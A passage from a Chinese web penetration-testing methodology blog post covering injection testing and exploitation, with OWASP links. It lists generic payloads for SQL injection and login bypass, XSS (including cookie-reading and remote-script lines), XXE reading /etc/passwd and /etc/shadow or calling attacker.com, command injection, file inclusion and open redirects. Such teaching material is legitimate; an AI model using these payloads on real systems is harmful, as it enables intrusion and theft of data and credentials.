<p>在每个分类下可以参照<a href="https://www.owasp.org/" target="_blank" rel="noopener">OWASP</a>获取更多地信息。</p>
<h4 id="9-1-SQLi"><a href="#9-1-SQLi" class="headerlink" title="9.1 SQLi"></a>9.1 SQLi</h4><p>任何将输入带入数据库进行查询的地方都可能存在SQL注入。结合错误的配置问题，会导致大量的数据被攻击者盗取。</p>
<p>我推荐你在做SQL注入时参照这个<a href="https://sqlwiki.netspi.com/#mysql" target="_blank" rel="noopener">Wiki</a>。如果你输入了这些Payload得到了数据库返回的错误信息，那么目标就非常有可能存在SQL注入漏洞。</p>
<p><code>Sqlmap</code>是一款自动化的SQL注入工具，我将会在漏洞利用阶段介绍它。</p>
<p><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005" target="_blank" rel="noopener">OWASP-测试SQL注入</a>)</p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos; OR 1=1 -- 1</span><br><span class="line">&apos; OR &apos;1&apos;=&apos;1</span><br><span class="line">&apos; or 1=1 LIMIT 1;-- </span><br><span class="line">admin&apos;;--</span><br><span class="line"></span><br><span class="line">http://www.example.com/product.php?id=10 AND 1=1</span><br></pre></td></tr></table></figure>
<h4 id="9-2-跨站脚本攻击-XSS"><a href="#9-2-跨站脚本攻击-XSS" class="headerlink" title="9.2 跨站脚本攻击(XSS)"></a>9.2 跨站脚本攻击(XSS)</h4><p>攻击者利用Web应用程序发送恶意代码(通常是JavaScript代码)给另外一个用户，就发生了XSS。</p>
<p>有三种不同的XSS：</p>
<ol>
<li>存储型。当提供给Web应用的数据是攻击者事先提交到服务器端永久保存的恶意代码时，发生存储型XSS。</li>
<li>反射型。当提供给Web应用的数据是服务端脚本利用攻击者的恶意输入生成的页面时，发生反射型XSS。</li>
<li>DOM型。DOM型XSS存在于客户端的脚本。</li>
</ol>
<p><a href="https://www.owasp.org/index.php/Testing_for_Cross_site_scripting" target="_blank" rel="noopener">OWASP-测试XSS</a></p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&lt;&quot;</span><br><span class="line">&quot; onmouseover=&quot;alert(&apos;XSS&apos;)</span><br><span class="line"></span><br><span class="line">http://server/cgi-bin/testcgi.exe?&lt;SCRIPT&gt;alert(“Cookie”+document.cookie)&lt;/SCRIPT&gt;</span><br><span class="line">%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e</span><br></pre></td></tr></table></figure>
<h4 id="9-3-XML-注入"><a href="#9-3-XML-注入" class="headerlink" title="9.3 XML 注入"></a>9.3 XML 注入</h4><p>当Web应用的XML解析器没有正确的验证攻击者传入的XML文档，就会发生XML注入。</p>
<p><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008" target="_blank" rel="noopener">OWASP-测试XML注入</a>)</p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username = foo&lt;</span><br><span class="line">Username = foo&lt;!--</span><br></pre></td></tr></table></figure>
<h4 id="9-4-XML实体注入-XXE"><a href="#9-4-XML实体注入-XXE" class="headerlink" title="9.4 XML实体注入(XXE)"></a>9.4 XML实体注入(XXE)</h4><p>若实体的定义是一个URI，那么这个实体就叫做外部实体。除非特别配置，不然外部实体会导致XML解析器去请求这个URI。比如请求本地或远程的一个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/shadow&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [  </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;http://www.attacker.com/text.txt&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="9-5-模板注入"><a href="#9-5-模板注入" class="headerlink" title="9.5 模板注入"></a>9.5 模板注入</h4><p>模板注入就是攻击者利用模板的语法注入恶意代码。</p>
<p><a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">Portswigger-服务端模板注入</a></p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 7 * 7 %&gt;</span><br><span class="line">&#123;&#123; 7 * 7 &#125;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="9-6-命令注入"><a href="#9-6-命令注入" class="headerlink" title="9.6 命令注入"></a>9.6 命令注入</h4><p>用户注入操作系统的命令到Web应用程序并被执行，就发生了命令注入。</p>
<p><a href="https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013" target="_blank" rel="noopener">OWASP-测试命令注入</a>)</p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</span><br><span class="line">http://sensitive/something.php?dir=%3Bcat%20/etc/passwd</span><br><span class="line"></span><br><span class="line">Doc=Doc1.pdf+|+Dir c:\</span><br></pre></td></tr></table></figure>
<h4 id="9-7-恶意重定向"><a href="#9-7-恶意重定向" class="headerlink" title="9.7 恶意重定向"></a>9.7 恶意重定向</h4><p>当应用没有检查用户可控输入时，攻击者输入了恶意的URL并被应用接受时发生。</p>
<p><a href="https://www.owasp.org/index.php/Testing_for_Client_Side_URL_Redirect_(OTG-CLIENT-004" target="_blank" rel="noopener">OWASP-测试客户端恶意重定向</a>)</p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.target.site?#redirect=www.fake-target.site </span><br><span class="line">http://www.target.site??url=http://www.fake-target.site</span><br></pre></td></tr></table></figure>
<h4 id="9-8-本地文件包含-LFI"><a href="#9-8-本地文件包含-LFI" class="headerlink" title="9.8 本地文件包含(LFI)"></a>9.8 本地文件包含(LFI)</h4><p>LFI指的是Web应用允许包含本地服务器端存在的文件。</p>
<p><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion" target="_blank" rel="noopener">OWASP-测试本地文件包含</a></p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable_host/preview.php?file=../../../../etc/passwd</span><br><span class="line">http://vulnerable_host/preview.php?file=../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
<h4 id="9-9-远程文件包含-RFI"><a href="#9-9-远程文件包含-RFI" class="headerlink" title="9.9 远程文件包含(RFI)"></a>9.9 远程文件包含(RFI)</h4><p>RFI指的是Web应用允许包含远程服务器上存在的文件。</p>
<p><a href="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion" target="_blank" rel="noopener">OWASP-测试远程文件包含</a></p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page</span><br></pre></td></tr></table></figure>
<h3 id="10-逻辑漏洞"><a href="#10-逻辑漏洞" class="headerlink" title="10. 逻辑漏洞"></a>10. 逻辑漏洞</h3><p>想要发现逻辑漏洞，你必须对目标非常了解。只有你对目标的功能都是怎么使用有了了解后，你才能推想哪里有可利用的地方。测试逻辑漏洞时，可以回想作为普通用户是如何使用Web应用的功能的，是如何一步一步完成各种动作的，然后你要做的就是不按照这些步骤来。</p>
<p>此外，这时候也可以测试下输入一些不切实际的值。(比如一款健生app，用户输入自己的跑步里程)。</p>
<p>这时也可以测试<a href="https://www.owasp.org/index.php/Unrestricted_File_Upload" target="_blank" rel="noopener">非法文件上传</a>。</p>
<h3 id="11-加密算法漏洞"><a href="#11-加密算法漏洞" class="headerlink" title="11. 加密算法漏洞"></a>11. 加密算法漏洞</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>SSLyze</td>
<td>TLS/SSL分析工具</td>
</tr>
</tbody>
</table>
<p>测试Web应用的TLS/SSL实现的质量，我推荐先去<a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">这里</a>，如果搞不到，可以用<code>SSLyze</code>。</p>
<ul>
<li>示例</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslyze --regular www.example.com</span><br></pre></td></tr></table></figure>
<p>分析的目的可以归结为：</p>
<ol>
<li>目标是否使用了某种形式的加密手段。</li>
<li>目标使用的加密手段是否已经过时(TLS 1.2, SSL2/SSl3)。</li>
</ol>
<p>这时候也应该注意目标是否用了脆弱的加密算法(MD5,RC4等)，是否支持正向加密(译者注: 一次一密)等。</p>
<h3 id="12-拒绝服务"><a href="#12-拒绝服务" class="headerlink" title="12. 拒绝服务"></a>12. 拒绝服务</h3><p>拒绝服务是利用某种手段让目标无法为合法用户提供服务。拒绝服务的类型包括用户文件上传(上传巨大文件)到用户账户锁定(为了防止登录爆破)等。</p>
<p>如果存在载入很慢的页面或者是Ajax请求很卡，那么就意味着这个地方可能会被用于拒绝服务攻击。</p>
<h3 id="13-Flash漏洞"><a href="#13-Flash漏洞" class="headerlink" title="13. Flash漏洞"></a>13. Flash漏洞</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Firefox Developer Tools</td>
<td>Firefox浏览器自带的用于诊断、审计、调试客户端代码的工具</td>
</tr>
<tr>
<td>JPEXS (FFDec)</td>
<td>开源的SWF文件反汇编工具</td>
</tr>
</tbody>
</table>
<p>如果目标使用了flash或者其他的需要编译的客户端技术(如silverlight)，那么你应该下载下来然后利用<code>JPEXS FFDec</code>这样的反汇编工具来审计他们的源代码。如果你成功的对他们进行了逆向工程，你可能会发现一些隐藏的漏洞。</p>
<h2 id="0x04-测试Web服务"><a href="#0x04-测试Web服务" class="headerlink" title="0x04 测试Web服务"></a>0x04 测试Web服务</h2><p>Web服务用于机器之间的数据交换，他们应该用之前介绍的方法进行测试(Mapping-&gt;漏洞挖掘-&gt;漏洞利用)，可以用<code>Burp</code>对请求进行拦截，然后分析接口返回的数据。</p>
<h3 id="1-测试REST服务"><a href="#1-测试REST服务" class="headerlink" title="1. 测试REST服务"></a>1. 测试REST服务</h3><p>如果有文档的话，测试REST服务之前应该阅读它。当然，这通常是白盒测试或者是灰盒测试时的做法，或者你想更深入的进行测试时也可以这么做。</p>
<p>在黑盒测试过程中，我们可以用<code>burp</code>拦截请求和响应，观察<code>JSON</code>格式的响应信息来了解接口的作用，但是这个过程非常麻烦，不是很推荐。</p>
<p>因为REST使用<code>http</code>协议，所以我们也可以测试之前的一些漏洞比如SQLi和XSS。</p>
<p>测试REST服务时可以参考以下文章：</p>
<ul>
<li><p><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-" target="_blank" rel="noopener">https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-</a></p>
</li>
<li><p><a href="http://blog.isecurion.com/2017/10/10/penetration-testing-restful-web-services/" target="_blank" rel="noopener">http://blog.isecurion.com/2017/10/10/penetration-testing-restful-web-services/</a></p>
</li>
<li><p><a href="https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet</a></p>
</li>
</ul>
<h3 id="2-测试SOAP服务"><a href="#2-测试SOAP服务" class="headerlink" title="2. 测试SOAP服务"></a>2. 测试SOAP服务</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Wsdler (BApp)</td>
<td>可以解析WSDL文件，然后测试所有的允许的方法的请求</td>
</tr>
</tbody>
</table>
<p>尽管如今我在渗透测试中观察到REST服务比SOAP服务更多，但还是应该注意它。</p>
<p>基于SOAP的Web服务有一点很好，就是他是通过WSDL文件自描述的。你可以用<code>Wsdler (BApp)</code>这样的工具来解析WSDL文件，然后用<code>Burp Repeater</code>来发送测试请求。</p>
<p>和REST一样，我们也可以测试之前的一些漏洞比如SQLi和XSS。</p>
<ul>
<li><p>检查任何一个在mapping和漏洞挖掘时发现的和服务有关的路径</p>
<ul>
<li>比如，<a href="http://exampleapplication.com/service" target="_blank" rel="noopener">http://exampleapplication.com/service</a></li>
</ul>
</li>
<li><p>查看WSDL文件获取接口信息然后导入Burp</p>
</li>
<li><p>在Burp Proxy的历史标签页，把WSDL文件通过<code>Parse WSDL</code>右键选项加入到Wsdler扩展</p>
</li>
<li><p>发送测试请求给Repeater，观察服务如何工作</p>
</li>
</ul>
<p>测试SOAP服务时可以参考：</p>
<ul>
<li><a href="https://blog.netspi.com/hacking-web-services-with-burp/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-web-services-with-burp/</a></li>
</ul>
<h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05 漏洞利用"></a>0x05 漏洞利用</h2><blockquote>
<p>在漏洞利用阶段，是利用之前发现的漏洞，评估他们影响范围与风险。</p>
</blockquote>
<p>简单来说，这一步就是查阅之前步骤中你所发现与记录的信息，尽可能深地利用发现的漏洞。有时在漏洞利用过程中，你可能需要更高的权限才能进行下去，这时你应该返回去，从mapping步骤开始重新迭代之前的过程。</p>
<p>下面是一些示例场景，但这一步是非常独特的。</p>
<h3 id="1-利用场景"><a href="#1-利用场景" class="headerlink" title="1. 利用场景"></a>1. 利用场景</h3><h3 id="2-利用XSS"><a href="#2-利用XSS" class="headerlink" title="2. 利用XSS"></a>2. 利用XSS</h3><h4 id="2-1-浏览器劫持"><a href="#2-1-浏览器劫持" class="headerlink" title="2.1 浏览器劫持"></a>2.1 浏览器劫持</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>BeEF</td>
<td>基于web的XSS平台</td>
</tr>
</tbody>
</table>
<p>如果你发现目标应用确实存在XSS漏洞，这时你可以试试是否可以用<code>BeEF</code>这样的工具来控制目标浏览器。</p>
<p>可以参考<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-browsers-with-beef-0159961/" target="_blank" rel="noopener">这篇</a>。</p>
<p>你可以使用自己的浏览器来验证XSS漏洞的危害性当你向客户展示你发现的XSS漏洞时。</p>
<h3 id="3-利用SQLi"><a href="#3-利用SQLi" class="headerlink" title="3. 利用SQLi"></a>3. 利用SQLi</h3><h4 id="3-1-数据提取"><a href="#3-1-数据提取" class="headerlink" title="3.1 数据提取"></a>3.1 数据提取</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>SQLMap</td>
<td>自动化的SQLi工具，可以检测和利用基于许多流行的关系型数据库的SQL注入漏洞</td>
</tr>
</tbody>
</table>
<p>如果目标存在SQLi且为了提取数据，<code>SQLMap</code>是首选。</p>
<p><a href="http://sqlmap.org/" target="_blank" rel="noopener">SQLMap</a>官网有详细的教程，我推荐你仔细看看。</p>
<h4 id="3-2-离线密码爆破"><a href="#3-2-离线密码爆破" class="headerlink" title="3.2 离线密码爆破"></a>3.2 离线密码爆破</h4><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hashcat</td>
<td>世界上最快最先进的密码恢复工具</td>
</tr>
</tbody>
</table>
<p>当你得到目标应用账户的密码时，可以尝试这个。</p>
<p>如果密码用了哈希算法加密，你可以用<code>hashcat</code>结合一个好的字典比如<code>rockyou.txt</code>来恢复密码。可以看<a href="https://www.alpinesecurity.com/blog/offline-password-cracking-the-attack-and-the-best-defense-against-it" target="_blank" rel="noopener">这篇</a>。</p>
<p>毋庸置疑，这将是您在渗透测试结束时可以为客户带来的最大发现之一。</p>
<h4 id="3-3-认证绕过"><a href="#3-3-认证绕过" class="headerlink" title="3.3 认证绕过"></a>3.3 认证绕过</h4><p>你可以尝试利用SQLi来提升自己的权限。网上有很多关于此的文章，下面这些payload你可以尝试在一些脆弱的表单里输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; --</span><br><span class="line">admin&apos; #</span><br><span class="line">admin&apos;/*</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;--</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;#</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;/*</span><br><span class="line">admin&apos;or 1=1 or &apos;&apos;=&apos;</span><br><span class="line">admin&apos; or 1=1</span><br></pre></td></tr></table></figure>
<h3 id="4-跨站请求伪造-CSRF"><a href="#4-跨站请求伪造-CSRF" class="headerlink" title="4. 跨站请求伪造(CSRF)"></a>4. 跨站请求伪造(CSRF)</h3><table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>Burp: Generate CSRF PoC</td>
<td>用于生成CSRF Poc的Burp模块</td>
</tr>
</tbody>
</table>
<p>如果目标存在CSRF漏洞(<code>Burp Scanner</code>会发现)，你可以用<code>Generate CSRF PoC</code>来验证是否真的存在。</p>
<p>可以看<a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-" target="_blank" rel="noopener">这篇</a>教程。</p>
<p>大概就下面这样：</p>
<ol>
<li>拦截一个HTTP请求(通常是修改账户信息的)</li>
<li>在Burp中右键</li>
<li>Generating the CSRF PoC(修改一些请求体的信息)</li>
<li>保存poc到一个html文件</li>
<li>打开html文件并点击提交</li>
<li>验证信息是否被恶意篡改</li>
</ol>
<h2 id="0x00-结尾"><a href="#0x00-结尾" class="headerlink" title="0x00 结尾"></a>0x00 结尾</h2><p>感谢阅读。</p>

          
<div class="post-copyright">
<p><span>本文标题：</span>Web渗透方法论</p>
<p><span>文章作者：</span>Mads</p>
<p><span>发布时间：</span>2018/08/02 12:00:00</p>
<p><span>更新时间：</span>2019/02/17 04:05:38</p>
<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2018/08/02/Web渗透方法论/</a></p>
<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
</div>
 
        </section>
    </article>
    
  </div>
  <aside>
    
    <div class="toc-container">
        <h1>目录</h1>
        <div class="content">
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-序言"><span class="toc-number">1.</span> <span class="toc-text">0x00 序言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-信息收集"><span class="toc-number">2.</span> <span class="toc-text">0x01 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-目标确认"><span class="toc-number">2.1.</span> <span class="toc-text">1. 目标确认</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-域名注册信息"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.1 域名注册信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-DNS信息查询"><span class="toc-number">2.1.2.</span> <span class="toc-text">1.2 DNS信息查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-测试域传送漏洞"><span class="toc-number">2.1.3.</span> <span class="toc-text">1.3 测试域传送漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-OSINT-公开情报收集"><span class="toc-number">2.2.</span> <span class="toc-text">2. OSINT 公开情报收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Mapping"><span class="toc-number">3.</span> <span class="toc-text">0x02 Mapping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-工具"><span class="toc-number">3.1.</span> <span class="toc-text">1. 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-端口扫描，服务识别，OS识别"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.1 端口扫描，服务识别，OS识别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-浏览器代理设置"><span class="toc-number">3.2.</span> <span class="toc-text">2. 浏览器代理设置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-Firefox"><span class="toc-number">3.2.1.</span> <span class="toc-text">2.1 Firefox</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-Firefox插件"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.2 Firefox插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-配置Firefox和Burpsuit"><span class="toc-number">3.2.3.</span> <span class="toc-text">2.3 配置Firefox和Burpsuit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-Burp配置"><span class="toc-number">3.2.4.</span> <span class="toc-text">2.4 Burp配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-Burp扩展"><span class="toc-number">3.2.5.</span> <span class="toc-text">2.5 Burp扩展</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-人工浏览"><span class="toc-number">3.3.</span> <span class="toc-text">3. 人工浏览</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-自动化爬取"><span class="toc-number">3.4.</span> <span class="toc-text">4. 自动化爬取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-后续分析"><span class="toc-number">3.5.</span> <span class="toc-text">5. 后续分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-需要特别注意"><span class="toc-number">3.5.1.</span> <span class="toc-text">5.1 需要特别注意</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞挖掘"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-过渡"><span class="toc-number">4.1.</span> <span class="toc-text">1. 过渡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-内容挖掘"><span class="toc-number">4.2.</span> <span class="toc-text">2. 内容挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-漏洞扫描"><span class="toc-number">4.2.1.</span> <span class="toc-text">2.1 漏洞扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-强制浏览-译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思"><span class="toc-number">4.3.</span> <span class="toc-text">3. 强制浏览(译者注：翻译的感觉很别扭，看下面内容应该能明白什么意思)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-测试可选内容"><span class="toc-number">4.3.1.</span> <span class="toc-text">3.1 测试可选内容</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-自动化的漏洞挖掘"><span class="toc-number">4.4.</span> <span class="toc-text">4. 自动化的漏洞挖掘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-配置"><span class="toc-number">4.5.</span> <span class="toc-text">5. 配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-默认配置"><span class="toc-number">4.5.1.</span> <span class="toc-text">5.1 默认配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-错误配置"><span class="toc-number">4.5.2.</span> <span class="toc-text">5.2 错误配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-身份认证"><span class="toc-number">4.6.</span> <span class="toc-text">6. 身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-模糊登录测试"><span class="toc-number">4.6.1.</span> <span class="toc-text">6.1 模糊登录测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Session管理"><span class="toc-number">4.7.</span> <span class="toc-text">7. Session管理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-1-用Burp测试Session-Tokens"><span class="toc-number">4.7.1.</span> <span class="toc-text">7.1 用Burp测试Session Tokens</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-授权"><span class="toc-number">4.8.</span> <span class="toc-text">8. 授权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-1-测试权限控制"><span class="toc-number">4.8.1.</span> <span class="toc-text">8.1 测试权限控制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-数据验证测试"><span class="toc-number">4.9.</span> <span class="toc-text">9. 数据验证测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#9-1-SQLi"><span class="toc-number">4.9.1.</span> <span class="toc-text">9.1 SQLi</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-2-跨站脚本攻击-XSS"><span class="toc-number">4.9.2.</span> <span class="toc-text">9.2 跨站脚本攻击(XSS)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-3-XML-注入"><span class="toc-number">4.9.3.</span> <span class="toc-text">9.3 XML 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-4-XML实体注入-XXE"><span class="toc-number">4.9.4.</span> <span class="toc-text">9.4 XML实体注入(XXE)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-5-模板注入"><span class="toc-number">4.9.5.</span> <span class="toc-text">9.5 模板注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-6-命令注入"><span class="toc-number">4.9.6.</span> <span class="toc-text">9.6 命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-7-恶意重定向"><span class="toc-number">4.9.7.</span> <span class="toc-text">9.7 恶意重定向</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-8-本地文件包含-LFI"><span class="toc-number">4.9.8.</span> <span class="toc-text">9.8 本地文件包含(LFI)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-9-远程文件包含-RFI"><span class="toc-number">4.9.9.</span> <span class="toc-text">9.9 远程文件包含(RFI)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-逻辑漏洞"><span class="toc-number">4.10.</span> <span class="toc-text">10. 逻辑漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-加密算法漏洞"><span class="toc-number">4.11.</span> <span class="toc-text">11. 加密算法漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-拒绝服务"><span class="toc-number">4.12.</span> <span class="toc-text">12. 